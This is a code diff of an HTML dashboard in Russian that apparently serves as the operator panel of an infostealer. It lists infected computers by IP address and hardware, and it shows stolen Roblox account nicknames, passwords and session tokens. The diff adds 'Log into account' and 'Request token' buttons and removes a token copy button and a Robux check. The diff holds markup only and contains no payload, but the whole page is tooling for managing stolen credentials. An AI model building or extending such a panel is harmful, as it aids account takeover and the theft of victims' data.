@@ -8,14 +8,16 @@
   <link rel="stylesheet" href="assets/style.css?v=35">
 </head>
 <body>
-
-  <div id="headerSlot"></div>
-
+  <div class="sidebar-layout">
+    <div id="sidebarSlot"></div>
+    <main class="main-content">
+      <div class="top-bar">
+        <h1 class="page-title">Управление файлами</h1>
+      </div>
   <div class="stats-bar">
-    <div class="stat-card"><div class="stat-label">Всего файлов</div><div class="stat-value accent" id="sTotal">—</div></div>
     <div class="stat-card"><div class="stat-label">Компьютеров</div><div class="stat-value" id="sPCs">—</div></div>
-    <div class="stat-card"><div class="stat-label">Общий объём</div><div class="stat-value" id="sSize">—</div></div>
-    <div class="stat-card"><div class="stat-label">Последняя отправка</div><div class="stat-value" id="sLast" style="font-size: 0.82rem;">—</div></div>
+    <div class="stat-card"><div class="stat-label">Roblox Аккаунтов</div><div class="stat-value accent" id="sRoblox">—</div></div>
+    <div class="stat-card"><div class="stat-label">Последняя отправка</div><div class="stat-value" id="sLast">—</div></div>
   </div>
 
   <div class="controls-panel">
@@ -35,54 +37,51 @@
     <div class="skeleton" style="height: 250px;"></div>
     <div class="skeleton" style="height: 250px;"></div>
   </main>
+  
+  </div> <!-- end of sidebar-layout -->
 
   <div id="fileModal" class="modal-overlay" onclick="closeModal()">
     <div class="modal-container" onclick="event.stopPropagation()">
       <button class="modal-close" onclick="closeModal()">✕</button>
       <div class="modal-content-wrapper">
-        <div class="modal-preview-pane" id="modalPreviewPane"></div>
-        <div class="modal-details-pane">
-          <h3 class="modal-filename" id="modalFilename">Название файла</h3>
-
-          <div class="specs-section">
-            <h4 class="section-title">Характеристики</h4>
-            <div class="specs-grid">
-              <div class="spec-row"><span class="spec-lbl">Компьютер</span><span class="spec-val" id="specName">—</span></div>
-              <div class="spec-row"><span class="spec-lbl">IP-адрес</span><span class="spec-val" id="specIp">—</span></div>
-              <div class="spec-row"><span class="spec-lbl">ОС</span><span class="spec-val" id="specOs">—</span></div>
-              <div class="spec-row"><span class="spec-lbl">CPU</span><span class="spec-val" id="specCpu">—</span></div>
-              <div class="spec-row"><span class="spec-lbl">RAM</span><span class="spec-val" id="specRam">—</span></div>
-              <div class="spec-row"><span class="spec-lbl">GPU</span><span class="spec-val" id="specGpu">—</span></div>
-              <div class="spec-row"><span class="spec-lbl">Дата</span><span class="spec-val" id="specDate">—</span></div>
-              <div class="spec-row"><span class="spec-lbl">Размер</span><span class="spec-val" id="specSize">—</span></div>
+      <div class="modal-content-wrapper" style="flex-direction: column; padding: 2rem; overflow-y: auto;">
+        <h3 class="modal-filename" id="modalFilename" style="text-align: center; margin-bottom: 2rem; font-size: 1.5rem; letter-spacing: -0.5px;">Название файла</h3>
+        
+        <div style="display: flex; gap: 2rem; flex-wrap: wrap;">
+          <div class="modal-details-pane">
+            <div class="specs-section">
+              <h4 class="section-title">Характеристики</h4>
+              <div class="specs-grid">
+                <div class="spec-row"><span class="spec-lbl">Компьютер</span><span class="spec-val" id="specName">—</span></div>
+                <div class="spec-row"><span class="spec-lbl">IP-адрес</span><span class="spec-val" id="specIp">—</span></div>
+                <div class="spec-row"><span class="spec-lbl">ОС</span><span class="spec-val" id="specOs">—</span></div>
+                <div class="spec-row"><span class="spec-lbl">CPU</span><span class="spec-val" id="specCpu">—</span></div>
+                <div class="spec-row"><span class="spec-lbl">RAM</span><span class="spec-val" id="specRam">—</span></div>
+                <div class="spec-row"><span class="spec-lbl">GPU</span><span class="spec-val" id="specGpu">—</span></div>
+                <div class="spec-row"><span class="spec-lbl">Дата</span><span class="spec-val" id="specDate">—</span></div>
+                <div class="spec-row"><span class="spec-lbl">Размер</span><span class="spec-val" id="specSize">—</span></div>
+              </div>
             </div>
           </div>
-
+          
+          <div class="modal-roblox-pane">
           <div class="specs-section" id="robloxSpecsSection">
             <h4 class="section-title">Roblox аккаунт</h4>
             <div class="specs-grid">
               <div class="spec-row"><span class="spec-lbl">Никнейм</span><span class="spec-val" id="robloxSpecUser" style="color: var(--success); font-weight: 700;">—</span></div>
-              <div class="spec-row"><span class="spec-lbl">Пароль</span><span class="spec-val" id="robloxSpecPass" style="color: var(--danger); font-weight: 700; letter-spacing: 0.5px;">—</span></div>
-              <div class="spec-row" id="robloxSpecTokenRow">
-                <span class="spec-lbl">Токен</span>
-                <div style="display:flex; flex-direction:column; align-items:flex-end; gap:6px; max-width:70%;">
-                  <div class="token-display" id="robloxSpecToken">—</div>
-                  <button class="copy-btn" id="robloxCopyBtn" style="padding:4px 12px; font-size:0.7rem; font-weight:600;" onclick="copyToken()">Копировать</button>
-                </div>
-              </div>
+              <div class="spec-row" id="tokenStatusRow" style="display:none;"><span class="spec-lbl">Статус</span><span class="spec-val" id="tokenStatusText" style="color: var(--danger); font-weight: 600;">—</span></div>
               <div class="spec-row" id="tokenRequestRow"><span class="spec-lbl">Запрос токена</span><span class="spec-val" id="tokenRequestStatus">—</span></div>
-              <div class="spec-row" id="robloxSpecRobuxRow" style="display:none;"><span class="spec-lbl">Robux</span><span class="spec-val" id="robloxSpecRobux" style="color: var(--success); font-weight: 800; font-size: 1.1rem;">—</span></div>
-              <div class="spec-row" id="robloxSpecStatusRow" style="display:none;"><span class="spec-lbl">Статус</span><span class="spec-val" id="robloxSpecStatus" style="font-weight: 600;">—</span></div>
             </div>
           </div>
 
           <div class="modal-actions">
-            <button class="modal-btn robux-btn" id="modalRobuxBtn">Проверить Robux</button>
+            <button class="modal-btn" id="modalLoginBtn" style="background:rgba(34,197,94,0.12); color:#22c55e; border:1px solid rgba(34,197,94,0.15);">👤 Войти в аккаунт</button>
             <button class="modal-btn" id="modalRequestBtn" style="background:rgba(99,102,241,0.15); color:var(--accent); border:1px solid rgba(99,102,241,0.3);">📡 Запросить токен</button>
-            <button class="modal-btn" id="modalRequestStatusBtn" style="background:rgba(245,158,11,0.12); color:var(--warning); border:1px solid rgba(245,158,11,0.25);">⟳ Проверить статус</button>
+
             <button class="modal-btn del-btn" id="modalDeleteBtn">Удалить</button>
           </div>
         </div>
+        </div> <!-- end flex container -->
       </div>
     </div>
   </div>
